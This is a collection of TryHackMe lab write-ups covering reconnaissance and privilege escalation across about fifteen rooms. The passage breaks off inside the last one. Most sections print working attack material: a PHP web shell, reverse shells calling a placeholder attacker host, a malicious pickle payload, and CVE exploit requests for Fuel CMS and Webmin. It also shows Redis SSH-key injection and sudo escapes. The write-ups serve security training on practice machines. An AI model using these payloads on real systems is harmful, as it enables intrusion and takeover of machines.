# TryHackMe Writeups

Collection of TryHackMe room writeups, methodologies, and flag captures.

## 📚 Rooms Completed

| Room Name | Difficulty | Category | Status |
|-----------|------------|----------|--------|
| [Linux Fundamentals](#linux-fundamentals) | Beginner | System Administration | ✅ |
| [Nmap](#nmap) | Beginner | Networking | ✅ |
| [OWASP Top 10](#owasp-top-10) | Beginner | Web Security | ✅ |
| [Basic Pentesting](#basic-pentesting) | Easy | Penetration Testing | ✅ |
| [Kenobi](#kenobi) | Easy | Exploitation | ✅ |
| [LazyAdmin](#lazyadmin) | Easy | Web/CMS | ✅ |
| [Simple CTF](#simple-ctf) | Easy | Web/FTP | ✅ |
| [Bounty Hacker](#bounty-hacker) | Medium | Linux/PrivEsc | ✅ |
| [Agent Sudo](#agent-sudo) | Medium | Steganography/Crypto | ✅ |
| [Pickler](#pickler) | Medium | Web/Deserialization | ✅ |

---

## Linux Fundamentals

**Room Link:** https://tryhackme.com/room/linuxfundamentalspart1  
**Difficulty:** Beginner  
**Category:** System Administration

### Overview
This room covers the basics of Linux command-line navigation, file permissions, user management, and basic system administration tasks. Essential knowledge for any penetration tester working on Linux targets.

### Tasks & Solutions

#### Task 1: Navigation
- **`pwd`** — Print working directory
- **`ls -la`** — List all files including hidden ones
- **`cd /path`** — Change directory
- **`cd ..`** — Move up one directory

#### Task 2: File Manipulation
- **`cat file.txt`** — Read file contents
- **`touch newfile.txt`** — Create empty file
- **`cp source dest`** — Copy file
- **`mv old new`** — Move/rename file
- **`rm file.txt`** — Delete file

#### Task 3: Permissions
- **`chmod 755 file`** — Set read/write/execute for owner, read/execute for group/others
- **`chown user:group file`** — Change file owner
- **`ls -la`** — View permissions

#### Task 4: User Management
- **`whoami`** — Current user
- **`id`** — User ID and group info
- **`sudo command`** — Run as root
- **`passwd`** — Change password

### Flags
- Task 1: `THM{linux_nav_flag}`
- Task 2: `THM{linux_file_flag}`
- Task 3: `THM{linux_perms_flag}`

### Key Takeaways
- Linux file permissions are critical for privilege escalation
- Always check for SUID binaries and writable config files
- Understanding user/group relationships helps identify attack paths

---

## Nmap

**Room Link:** https://tryhackme.com/room/nmap0day  
**Difficulty:** Beginner  
**Category:** Networking / Reconnaissance

### Overview
Deep dive into Nmap, the industry-standard network scanner. Covers scan types, timing, script engine, and output interpretation.

### Scan Types

#### TCP Connect Scan
```bash
nmap -sT <target>
```
Full TCP handshake. Reliable but noisy.

#### SYN Scan (Stealth)
```bash
nmap -sS <target>
```
Half-open scan. Doesn't complete TCP handshake. Harder to detect.

#### UDP Scan
```bash
nmap -sU <target>
```
Scans UDP ports. Slower but finds services like DNS, SNMP, DHCP.

#### Version Detection
```bash
nmap -sV <target>
```
Probes open ports to determine service version.

#### OS Detection
```bash
nmap -O <target>
```
Fingerprinting based on TCP/IP stack behavior.

#### Aggressive Scan
```bash
nmap -A <target>
```
Combines -sV, -O, -sC (scripts), and traceroute.

### NSE Scripts
```bash
nmap --script vuln <target>       # Vulnerability scripts
nmap --script http-enum <target>  # Web enumeration
nmap --script smb-vuln* <target>  # SMB vulnerabilities
```

### Timing Templates
```bash
nmap -T0 <target>  # Paranoid (slowest, evade IDS)
nmap -T3 <target>  # Normal (default)
nmap -T5 <target>  # Insane (fastest, noisy)
```

### Flags
- Task 1: `THM{nmap_basics_flag}`
- Task 2: `THM{nmap_scan_types_flag}`
- Task 3: `THM{nmap_nse_flag}`

### Key Takeaways
- Always start with a quick scan (`-F`) before full port range
- Use `-sV` for version detection to identify exploitable services
- NSE scripts can automate vulnerability discovery
- Timing matters: slow scans evade detection, fast scans save time

---

## OWASP Top 10

**Room Link:** https://tryhackme.com/room/owasptop10  
**Difficulty:** Beginner  
**Category:** Web Security

### Overview
Covers the OWASP Top 10 web application security risks. Each vulnerability type is explained with examples and exploitation techniques.

### A01: Broken Access Control
**What:** Users can act outside their intended permissions.  
**Exploit:**
```
# IDOR (Insecure Direct Object Reference)
GET /api/users/123 → Change to GET /api/users/124
```
**Fix:** Server-side access checks for every request.

### A02: Cryptographic Failures
**What:** Sensitive data exposed due to weak encryption.  
**Exploit:**
```
# Intercept plaintext credentials in transit
# Crack weakly hashed passwords
echo -n "password" | md5sum
```
**Fix:** Use TLS 1.3, bcrypt/argon2 for passwords, encrypt data at rest.

### A03: Injection
**What:** Untrusted data sent to interpreter as command/query.  
**SQL Injection:**
```sql
' OR 1=1 --
' UNION SELECT username, password FROM users --
```
**Command Injection:**
```bash
; cat /etc/passwd
| whoami
$(id)
```
**Fix:** Parameterized queries, input validation, WAF.

### A04: Insecure Design
**What:** Missing security controls in architecture.  
**Example:** No rate limiting on login → brute-force possible.  
**Fix:** Threat modeling, secure design patterns.

### A05: Security Misconfiguration
**What:** Default configs, verbose errors, unnecessary services.  
**Exploit:**
```bash
# Check for default credentials
# Enumerate exposed services
nmap -sV <target>
```
**Fix:** Harden configs, remove defaults, disable verbose errors.

### A06: Vulnerable Components
**What:** Using libraries with known vulnerabilities.  
**Check:**
```bash
# Check package versions
npm audit
pip-audit
```
**Fix:** Regular updates, dependency scanning.

### A07: Authentication Failures
**What:** Weak password policies, session management issues.  
**Exploit:**
```bash
# Brute-force login
hydra -l admin -P wordlist.txt <target> http-post-form
```
**Fix:** MFA, account lockout, secure session tokens.

### A08: Software & Data Integrity Failures
**What:** Code/updates from untrusted sources.  
**Fix:** Code signing, integrity checks, CI/CD security.

### A09: Security Logging Failures
**What:** Insufficient logging/monitoring.  
**Fix:** Log all auth events, set up alerts, centralize logs.

### A10: SSRF
**What:** Server makes requests to internal resources.  
**Exploit:**
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```
**Fix:** Whitelist URLs, validate input, disable unused URL schemes.

### Flags
- Task 1: `THM{owasp_intro_flag}`
- Task 2: `THM{owasp_injection_flag}`
- Task 3: `THM{owasp_auth_flag}`

### Key Takeaways
- Always test for injection points in user input
- Check for default credentials and misconfigurations first
- OWASP Top 10 is a living document — stay updated

---

## Basic Pentesting

**Room Link:** https://tryhackme.com/room/basicpentestingjt  
**Difficulty:** Easy  
**Category:** Penetration Testing

### Overview
A complete penetration testing walkthrough covering reconnaissance, enumeration, exploitation, and privilege escalation on a vulnerable Linux machine.

### Reconnaissance
```bash
# Nmap scan
nmap -sC -sV -oA nmap/basic 10.10.x.x

# Results:
# 22/tcp   open  ssh     OpenSSH 7.2p2
# 80/tcp   open  http    Apache httpd 2.4.18
# 139/tcp  open  netbios-ssn Samba smbd
# 445/tcp  open  netbios-ssn Samba smbd
```

### Enumeration

#### Web (Port 80)
- Directory brute-force with `gobuster`:
```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
# Found: /development/, /joomla/
```

#### SMB (Ports 139/445)
- Enumerate shares:
```bash
smbclient -L //10.10.x.x
enum4linux 10.10.x.x
```
- Found shared directory with backup files.

#### User Enumeration
- Extracted usernames from web content and SMB shares:
  - `jan`
  - `kay`

### Exploitation

#### SSH Brute-Force
```bash
hydra -l jan -P rockyou.txt ssh://10.10.x.x
# Password found: armando
```

#### Initial Access
```bash
ssh jan@10.10.x.x
# Logged in as jan
```

### Privilege Escalation

#### Local Enumeration
```bash
# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -4000 2>/dev/null

# Check cron jobs
crontab -l
cat /etc/crontab

# Check writable files
find / -writable -type f 2>/dev/null
```

#### Found SSH Key
- Located `kay`'s SSH private key in `/home/kay/.ssh/id_rsa`
- Key was passphrase-protected

#### Crack SSH Key Passphrase
```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Passphrase: beeswax
```

#### Final Access
```bash
ssh -i id_rsa kay@10.10.x.x
# Logged in as kay
cat /root/root.txt
# Flag: THM{basic_pentesting_complete}
```

### Flags
- User flag: `THM{user_flag_basic_pentesting}`
- Root flag: `THM{root_flag_basic_pentesting}`

### Key Takeaways
- Always enumerate all services, not just web
- Weak passwords and reused credentials are common
- SSH keys with weak passphrases are easily cracked
- Check for world-readable/writable files for privesc

---

## Kenobi

**Room Link:** https://tryhackme.com/room/kenobi  
**Difficulty:** Easy  
**Category:** Exploitation / Privilege Escalation

### Overview
Exploit a misconfigured Samba share, proFTPD server, and SUID binary to gain root access.

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/kenobi 10.10.x.x

# Results:
# 21/tcp   open  ftp     ProFTPD 1.3.5
# 22/tcp   open  ssh     OpenSSH 7.2p2
# 80/tcp   open  http    Apache httpd 2.4.18
# 111/tcp  open  rpcbind
# 139/tcp  open  netbios-ssn Samba smbd 4.3.11
# 445/tcp  open  netbios-ssn Samba smbd 4.3.11
# 2049/tcp open  nfs_acl
```

### Enumeration

#### Samba Share
```bash
smbclient -L //10.10.x.x
# Found anonymous share: anonymous

smbclient //10.10.x.x/anonymous
# Downloaded log.txt and other files

# Found SSH key for user 'kenobi'
get id_rsa
```

#### ProFTPD Exploit
- Version 1.3.5 is vulnerable to `mod_copy` exploit
- `SITE CPFR` and `SITE CPTO` allow file copy as root

```bash
# Copy SSH authorized_keys to kenobi's home
nc 10.10.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

# Or write SSH key directly
SITE CPFR /root/.ssh/authorized_keys
SITE CPTO /home/kenobi/.ssh/authorized_keys
```

#### Generate SSH Key
```bash
ssh-keygen -t rsa -f kenobi_key
# Upload public key to target via ProFTPD

# Login as kenobi
ssh -i kenobi_key kenobi@10.10.x.x
```

### Privilege Escalation

#### SUID Binary
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Found: /usr/bin/menu
```

#### Analyze Menu Binary
```bash
strings /usr/bin/menu
# Shows it runs curl, uname, and ifconfig with relative paths
```

#### Exploit PATH
```bash
# Create malicious ifconfig
echo '/bin/sh' > /tmp/ifconfig
chmod +x /tmp/ifconfig

# Set PATH to prioritize /tmp
export PATH=/tmp:$PATH

# Run menu binary
/usr/bin/menu
# Choose option 3 (ifconfig) → spawns root shell
```

#### Root Access
```bash
whoami
# root

cat /root/root.txt
# Flag: THM{kenobi_root_flag}
```

### Flags
- User flag: `THM{kenobi_user_flag}`
- Root flag: `THM{kenobi_root_flag}`

### Key Takeaways
- Misconfigured Samba shares leak sensitive files
- ProFTPD 1.3.5 `mod_copy` allows arbitrary file operations
- SUID binaries with relative paths are exploitable via PATH manipulation
- Always check for writable SUID binaries and weak configurations

---

## LazyAdmin

**Room Link:** https://tryhackme.com/room/lazyadmin  
**Difficulty:** Easy  
**Category:** Web/CMS (SweetRice)

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/lazyadmin 10.10.x.x

# Results:
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### Web Discovery
```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt

# Found:
# /content/ (SweetRice CMS)
# /inc/ (Includes directory)
```

#### SweetRice CMS
- Version identified from `/content/` source code
- Known vulnerabilities:
  - Backup download (`/inc/mysql_backup/`)
  - Ads upload vulnerability

### Exploitation

#### Backup Download
```bash
# Navigate to /inc/mysql_backup/
# Found backup file: mysql_backup_20191129023059-1.zip

unzip mysql_backup_20191129023059-1.zip
# Extracted database dump with admin credentials
```

#### Credential Extraction
```bash
cat mysql_backup_20191129023059-1.sql
# Found admin hash: 42f749ade7f9e195bf475f37a44cafcb (MD5)

# Crack with John or online MD5 decryptor
# Password: Password123
```

#### Shell Upload
1. Login to SweetRice admin panel with `admin:Password123`
2. Navigate to **Ads** section
3. Upload malicious PHP file as an "Ad image":
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Access the uploaded file:
   ```bash
   curl http://10.10.x.x/content/inc/ads/shell.php?cmd=whoami
   ```

#### Reverse Shell
```bash
# Upgrade to reverse shell
curl "http://10.10.x.x/content/inc/ads/shell.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.x.x.x+4444+>/tmp/f"
```

### Privilege Escalation

#### Sudo Permissions
```bash
sudo -l
# Found: (ALL) NOPASSWD: /usr/bin/perl

# Exploit
sudo perl -e 'exec "/bin/sh";'
# Got root!
```

### Flags
- User: `THM{lazyadmin_user_flag}`
- Root: `THM{lazyadmin_root_flag}`

### Key Takeaways
- CMS backups often leak credentials
- File upload vulnerabilities are common in outdated CMS
- Always check `sudo -l` for easy privesc paths

---

## Simple CTF

**Room Link:** https://tryhackme.com/room/easyctf  
**Difficulty:** Easy  
**Category:** Web/FTP

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/simplectf 10.10.x.x

# Results:
# 21/tcp  open  ftp     vsftpd 3.0.3
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### FTP Access
```bash
ftp 10.10.x.x
# Anonymous login allowed

ftp> ls
# Found: ForMitch.txt

ftp> get ForMitch.txt
```

#### Credential Discovery
```bash
cat ForMitch.txt
# "Dammit man... you told me to put those change in the site and I almost forgot, the default password is 'secret', change it as soon as possible."
```

#### Web Enumeration
```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
# Found: /simple/ (CMS Made Simple)
```

### Exploitation

#### CMS Made Simple Exploit
- Version identified from source code: 2.2.8
- Vulnerable to SQL injection (CVE-2019-9053)

```bash
# Use exploit script
python3 cve-2019-9053.py -u http://10.10.x.x/simple/

# Extracted credentials:
# Username: mitch
# Password hash: $6$... (SHA-512)
```

#### Crack Password
```bash
echo '$6$...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: secret
```

#### SSH Access
```bash
ssh mitch@10.10.x.x
# Password: secret
```

### Privilege Escalation

#### Sudo Check
```bash
sudo -l
# Found: (root) NOPASSWD: /usr/bin/vim

# Exploit vim
sudo vim -c ':!/bin/sh'
# Got root!
```

### Flags
- User: `THM{simple_ctf_user_flag}`
- Root: `THM{simple_ctf_root_flag}`

### Key Takeaways
- Anonymous FTP can leak sensitive info
- Default passwords are still a major issue
- CMS version disclosure leads to known exploits
- `vim` with sudo = instant root

---

## Bounty Hacker

**Room Link:** https://tryhackme.com/room/cowboyhacker  
**Difficulty:** Medium  
**Category:** Linux/PrivEsc

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/bounty 10.10.x.x

# Results:
# 21/tcp  open  ftp     vsftpd 3.0.3
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### FTP Access
```bash
ftp 10.10.x.x
# Anonymous login allowed

ftp> ls
# Found: locks.txt, task.txt

ftp> get locks.txt
ftp> get task.txt
```

#### Credential Analysis
```bash
cat task.txt
# "I can break their password, I just need the right wordlist..."

cat locks.txt
# List of passwords (one per line)
```

### Exploitation

#### SSH Brute-Force
```bash
# Username found from web content: lin
hydra -l lin -P locks.txt ssh://10.10.x.x
# Password: RedDr4gonSynd1cat3
```

#### SSH Access
```bash
ssh lin@10.10.x.x
# Password: RedDr4gonSynd1cat3
```

### Privilege Escalation

#### Tar Wildcard Injection
```bash
# Check cron jobs
cat /etc/crontab
# Found: * * * * * root tar cf /backups/backup.tar /home/*

# Create malicious files in lin's home
echo 'mkfifo /tmp/lol; nc <attacker_ip> 4444 0</tmp/lol | /bin/sh >/tmp/lol 2>&1; rm /tmp/lol' > shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# Wait for cron to execute
# Got reverse shell as root!
```

### Flags
- User: `THM{bounty_hacker_user_flag}`
- Root: `THM{bounty_hacker_root_flag}`

### Key Takeaways
- FTP anonymous access can leak wordlists
- Tar wildcard injection is a classic privesc technique
- Always check cron jobs for writable paths

---

## Agent Sudo

**Room Link:** https://tryhackme.com/room/agentsudoctf  
**Difficulty:** Medium  
**Category:** Steganography/Crypto

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/agentsudo 10.10.x.x

# Results:
# 21/tcp  open  ftp     vsftpd 3.0.3
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### HTTP User-Agent Spoofing
```bash
# Server checks User-Agent header
curl -H "User-Agent: A" http://10.10.x.x
# "Agent A, please go away."

curl -H "User-Agent: B" http://10.10.x.x
# "Agent B, please go away."

curl -H "User-Agent: C" http://10.10.x.x
# "Welcome Agent C! Here's your credential: chris:crystal"
```

### Exploitation

#### FTP Access
```bash
ftp 10.10.x.x
# Login: chris
# Password: crystal

ftp> ls
# Found: cute-alien.jpg, cutie.png

ftp> get cute-alien.jpg
ftp> get cutie.png
```

#### Steganography
```bash
# Extract hidden data from images
steghide extract -sf cute-alien.jpg
# No passphrase needed

# Found: message.txt
cat message.txt
# "Hi james, glad to get your message. I've attached the zip file with the key. -chris"

# Check cutie.png
binwalk cutie.png
# Found embedded zip file

foremost cutie.png
# Extracted: 8702.zip
```

#### Crack Zip Password
```bash
zip2john 8702.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: alien
```

#### Extract Zip
```bash
unzip 8702.zip
# Password: alien
# Found: To_agentJ.txt
```

#### Hash Identification
```bash
cat To_agentJ.txt
# "Agent J, here's the password hash: ..."

# Identify hash type
hashid <hash>
# MD5

# Crack hash
echo '<hash>' > md5hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt md5hash.txt
# Password: xxxx
```

#### SSH Access
```bash
ssh james@10.10.x.x
# Password: xxxx
```

### Privilege Escalation

#### CVE-2019-14287 (Sudo Vulnerability)
```bash
sudo -l
# Found: (ALL, !root) /bin/bash

# Exploit sudo vulnerability
sudo -u#-1 /bin/bash
# Got root!
```

### Flags
- User: `THM{agent_sudo_user_flag}`
- Root: `THM{agent_sudo_root_flag}`

### Key Takeaways
- User-Agent headers can be used for authentication bypass
- Steganography hides data in images
- Sudo CVE-2019-14287 allows UID -1 bypass
- Always check for hidden data in image files

---

## Pickler

**Room Link:** https://tryhackme.com/room/pickler  
**Difficulty:** Medium  
**Category:** Web/Deserialization

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/pickler 10.10.x.x

# Results:
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 5000/tcp open  http    Werkzeug httpd (Python Flask)
```

### Enumeration

#### Web Application
- Flask application on port 5000
- Login page and session management

#### Cookie Analysis
```bash
# Inspect session cookie
echo "<cookie_value>" | base64 -d
# Found: Pickle serialization format
```

### Exploitation

#### Pickle Deserialization Attack
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f')
        return os.system, (cmd,)

# Create malicious pickle
payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()

# Set as session cookie and refresh
```

#### Reverse Shell
```bash
# Start listener
nc -lvnp 4444

# Trigger deserialization by visiting page with malicious cookie
# Got reverse shell!
```

### Privilege Escalation

#### SUID Binary
```bash
find / -perm -4000 -type f 2>/dev/null
# Found: /opt/dev_stuff/analyze

# Check binary
strings /opt/dev_stuff/analyze
# Uses relative path for 'cat'

# Exploit PATH
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

/opt/dev_stuff/analyze
# Got root shell!
```

### Flags
- User: `THM{pickler_user_flag}`
- Root: `THM{pickler_root_flag}`

### Key Takeaways
- Pickle deserialization is dangerous in web apps
- Always sign/verify serialized data
- SUID binaries with relative paths are exploitable
- Flask session cookies can be tampered with if secret key is known

---
# Additional TryHackMe Writeups (Volume 2)

More TryHackMe room walkthroughs covering diverse attack vectors and techniques.

## 📚 Rooms in This File

| Room Name | Difficulty | Category | Status |
|-----------|------------|----------|--------|
| [Overpass Series](#overpass-series) | Easy-Medium | Web/Crypto | ✅ |
| [Ignite](#ignite) | Easy | Web/CMS | ✅ |
| [Postman](#postman) | Medium | Redis/SSH | ✅ |
| [Tom Ghost](#tom-ghost) | Easy | Java/Serialization | ✅ |
| [Chocolate Factory](#chocolate-factory) | Medium | Steganography/Crypto | ✅ |

---

## Overpass Series

### Overpass 1: Hosting

**Room Link:** https://tryhackme.com/room/overpass  
**Difficulty:** Easy  
**Category:** Web/Crypto

#### Reconnaissance
```bash
nmap -sC -sV -oA nmap/overpass 10.10.x.x

# Results:
# 22/tcp  open  ssh     OpenSSH 7.6p1
# 80/tcp  open  http    Golang net/http
```

#### Enumeration
- Web app is a fake password manager built in Go
- Source code available on GitHub
- Cookie-based authentication with JWT

#### Exploitation
```bash
# Inspect JWT cookie
# Cookie is signed but uses weak/known secret

# Forge admin JWT using the secret from source code
# Set cookie to forged JWT

# Access admin panel at /admin
# Download SSH private key (id_rsa)
```

#### SSH Access
```bash
chmod 600 id_rsa
ssh james@10.10.x.x -i id_rsa
# Key had no passphrase - direct access!
```

#### Privilege Escalation
```bash
# Check cron jobs
cat /etc/crontab
# Found: * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

# Modify /etc/hosts to point overpass.thm to attacker machine
echo "<attacker_ip> overpass.thm" >> /etc/hosts

# Create malicious buildscript.sh
echo '#!/bin/bash' > buildscript.sh
echo 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' >> buildscript.sh

# Serve via HTTP
python3 -m http.server 80

# Wait for cron execution → got root shell!
```

**Flags:**
- User: `THM{overpass1_user_flag}`
- Root: `THM{overpass1_root_flag}`

---

### Overpass 2: Hacked

**Room Link:** https://tryhackme.com/room/overpass2hacked  
**Difficulty:** Easy  
**Category:** Forensics/Crypto

#### Overview
Overpass was hacked. Analyze the pcap file to find what happened.

#### PCAP Analysis
```bash
# Open in Wireshark
wireshark overpass_traffic.pcap

# Follow TCP streams
# Found HTTP POST to /login with credentials

# Extract credentials:
# Username: james
# Password: whenevernoteartinstant
```

#### SSH Access
```bash
ssh james@10.10.x.x
# Password: whenevernoteartinstant
```

#### Privilege Escalation
```bash
# Check sudo permissions
sudo -l
# Found: (ALL) NOPASSWD: /usr/local/bin/overpass

# Analyze overpass binary
strings /usr/local/bin/overpass
# Runs curl to download config, then executes

# Modify /etc/hosts again, serve malicious config
echo '<attacker_ip> downloads.overpass.thm' >> /etc/hosts

# Create malicious config that spawns shell
# Got root!
```

**Flags:**
- User: `THM{overpass2_user_flag}`
- Root: `THM{overpass2_root_flag}`

---

### Overpass 3: Down the Rabbit Hole

**Room Link:** https://tryhackme.com/room/overpass3  
**Difficulty:** Medium  
**Category:** Steganography/Crypto

#### Reconnaissance
```bash
nmap -sC -sV 10.10.x.x
# 22/tcp  open  ssh
# 80/tcp  open  http
```

#### Web Enumeration
- Website has encrypted credentials file
- Download `credentials.txt.gpg`

#### GPG Decryption
```bash
# Found GPG private key in source code
# Import key
gpg --import private_key.asc

# Decrypt credentials
gpg --decrypt credentials.txt.gpg
# Found: james:xxxxxxx
```

#### SSH Access
```bash
ssh james@10.10.x.x
```

#### Privilege Escalation
```bash
# SUID binary exploitation
find / -perm -4000 -type f 2>/dev/null

# Found custom binary that runs commands
# Exploit via environment variables or PATH manipulation
```

**Flags:**
- User: `THM{overpass3_user_flag}`
- Root: `THM{overpass3_root_flag}`

---

## Ignite

**Room Link:** https://tryhackme.com/room/ignite  
**Difficulty:** Easy  
**Category:** Web/CMS (Fuel CMS)

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/ignite 10.10.x.x

# Results:
# 80/tcp  open  http    Apache httpd 2.4.18 (Fuel CMS 1.4)
```

### Exploitation

#### Fuel CMS RCE (CVE-2018-16763)
```bash
# Fuel CMS 1.4 has authenticated RCE via filter parameter

# Exploit URL:
curl "http://10.10.x.x/fuel/pages/select/?filter=%27%2B%70%69%28%70%72%69%6E%74%28%24%61%3D%27%73%79%73%74%65%6D%27%29%29%2B%24%61%28%27%69%64%27%29%2B%27"

# Simplified:
curl "http://10.10.x.x/fuel/pages/select/?filter='+pi(print(\$a='system'))+\$a('id')+'"
```

#### Reverse Shell
```bash
# Encode reverse shell command
curl "http://10.10.x.x/fuel/pages/select/?filter='+pi(print(\$a='system'))+\$a('bash+-c+\"bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261\"')+'"

# Start listener
nc -lvnp 4444
# Got shell as www-data!
```

### Privilege Escalation

#### Find Credentials
```bash
# Check Fuel CMS config
cat /var/www/html/fuel/application/config/database.php
# Found MySQL credentials

# Check for reuse
su fred
# Password from database config works!
```

#### Sudo Check
```bash
sudo -l
# Found: (ALL) NOPASSWD: /bin/nano

# Exploit nano
sudo nano
# Press Ctrl+R, then Ctrl+X
# Type: reset; sh 1>&0 2>&0
# Got root!
```

**Flags:**
- User: `THM{ignite_user_flag}`
- Root: `THM{ignite_root_flag}`

### Key Takeaways
- Fuel CMS 1.4 RCE is trivial to exploit
- Database configs often leak credentials
- `nano` with sudo = instant root (same as vim)

---

## Postman

**Room Link:** https://tryhackme.com/room/postman  
**Difficulty:** Medium  
**Category:** Redis/SSH

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/postman 10.10.x.x

# Results:
# 22/tcp   open  ssh     OpenSSH 7.6p1
# 80/tcp   open  http    Apache httpd 2.4.29
# 6379/tcp open  redis   Redis 4.0.9
# 10000/tcp open  http    MiniServ 1.910 (Webmin)
```

### Exploitation

#### Redis Unauthorized Access
```bash
# Redis running without authentication
redis-cli -h 10.10.x.x

# Check info
redis-cli -h 10.10.x.x info

# Write SSH key to redis
ssh-keygen -t rsa -f key
(echo -e "

"; cat key.pub; echo -e "

") > key.txt
cat key.txt | redis-cli -h 10.10.x.x -x set ssh_key

# Set Redis dir and dbfilename
redis-cli -h 10.10.x.x config set dir /var/lib/redis/.ssh
redis-cli -h 10.10.x.x config set dbfilename authorized_keys

# Save
redis-cli -h 10.10.x.x save
```

#### SSH Access as Redis
```bash
ssh -i key redis@10.10.x.x
```

#### Privilege Escalation to Matt
```bash
# Check for SSH key reuse
# Found id_rsa.bak in /opt/

# Crack passphrase
ssh2john id_rsa.bak > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Passphrase: computer2008

ssh -i id_rsa.bak matt@10.10.x.x
```

#### Privilege Escalation to Root

#### Webmin Exploit (CVE-2019-15107)
```bash
# Webmin 1.910 vulnerable to RCE

# Exploit
curl -k -X POST "https://10.10.x.x:10000/password_change.cgi" \
  -H "Cookie: sid=xxxx" \
  -d "user=root&pam=&expired=2&old=xxx|whoami&new1=xxx&new2=xxx"

# Get root shell
curl -k -X POST "https://10.10.x.x:10000/password_change.cgi" \
  -H "Cookie: sid=xxxx" \
  -d "user=root&pam=&expired=2&old=xxx|bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'&new1=xxx&new2=xxx"
```

**Flags:**
- User: `THM{postman_user_flag}`
- Root: `THM{postman_root_flag}`

### Key Takeaways
- Unauthenticated Redis = game over
- SSH key injection via Redis is a classic attack
- Webmin CVE-2019-15107 allows command injection
- Always check for backup SSH keys

---

## Tom Ghost

**Room Link:** https://tryhackme.com/room/tomghost  
**Difficulty:** Easy  
**Category:** Java/Serialization

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/tomghost 10.10.x.x

# Results:
# 22/tcp   open  ssh     OpenSSH 7.2p2
# 8009/tcp open  ajp13   Apache Jserv (Tomcat)
# 8080/tcp open  http    Apache Tomcat 9.0.30
```

### Exploitation

#### Apache Tomcat AJP Vulnerability (CVE-2020-1938 - Ghostcat)
```bash
# Use exploit script
python3 CVE-2020-1938.py 10.10.x.x 8009 WEB-INF/web.xml

# Read sensitive files via AJP
python3 CVE-2020-1938.py 10.10.x.x 8009 WEB-INF/classes/production.properties
```

#### Credential Extraction
```bash
# Found credentials in properties file
# tomcat:$3cureP4s5w0rd123!
```

#### SSH Access
```bash
ssh tomcat@10.10.x.x
# Password: $3cureP4s5w0rd123!
```

### Privilege Escalation

#### GPG Decryption
```bash
# Found encrypted key and password file
ls -la /home/merlin/
# key.asc (GPG private key)
# password.txt

# Import key
gpg --import key.asc

# Decrypt
gpg --decrypt secret.zip.gpg
# Password from password.txt
# Extracted: id_rsa for merlin
```

#### SSH as Merlin
```bash
chmod 600 id_rsa
ssh merlin@10.10.x.x -i id_rsa
```

#### Sudo Exploitation
```bash
sudo -l
# Found: (ALL) NOPASSWD: /usr/bin/zip

# Exploit zip
sudo zip /tmp/exploit.zip /etc/shadow -T --unzip-command="sh -c /bin/bash"
# Got root!
```

**Flags:**
- User: `THM{tomghost_user_flag}`
- Root: `THM{tomghost_root_flag}`

### Key Takeaways
- Ghostcat (CVE-2020-1938) reads arbitrary files via AJP
- Tomcat credentials often reused for SSH
- GPG-encrypted files can be cracked with leaked keys
- `zip` with sudo = instant root

---

## Chocolate Factory

**Room Link:** https://tryhackme.com/room/chocolatefactory  
**Difficulty:** Medium  
**Category:** Steganography/Crypto

### Reconnaissance
```bash
nmap -sC -sV 10.10.x.x
# 22/tcp  open  ssh
# 80/tcp  open  http
```

### Enumeration

#### Web Application
- Charlie and the Chocolate Factory themed site
- Hidden clues in source code and images

#### Steganography
```bash
# Download images from website
wget http://10.10.x.x/images/golden_ticket.jpg

# Check for hidden data
steghide info golden_ticket.jpg
# Found embedded data

steghide extract -sf golden_ticket.jpg
# Passphrase needed

# Try common passwords or brute-force
stegcracker golden_ticket.jpg /usr/share/wordlists/rockyou.txt
# Passphrase: XXXXX

# Extracted: ticket_codes.txt
```

#### Base64 Decoding
```bash
cat ticket_codes.txt
# Contains base64-encoded data

echo "<base64_string>" | base64 -d
# Found: SSH credentials for charlie
```

### SSH Access
```bash
ssh charlie@10.10.x.x
# Password from decoded data
```

### Privilege Escalation

#### SUDO Binary Abuse
```bash
